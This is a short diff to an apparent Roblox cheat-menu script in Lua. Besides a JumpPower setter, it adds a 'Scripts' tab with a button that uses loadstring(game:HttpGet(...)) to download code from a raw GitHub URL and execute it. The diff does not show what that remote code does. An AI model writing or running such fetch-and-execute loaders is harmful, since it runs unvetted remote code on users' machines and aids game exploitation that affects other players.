@@ -115,3 +115,10 @@ tab.newInput("JumpPower", "Enter a value to set JumpPower", function(jump)
     local humanoid = getHumanoid()
     humanoid.JumpPower = tonumber(jump) or humanoid.JumpPower
 end)
+
+tab = createTab("-•Scripts•-", "ImageIdHere")
+tab.newLabel("-•--Scripts--•-")
+
+tab.newButton("system.broken", "call", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/03yome/D/refs/heads/main/System%20broken"))()
+end)
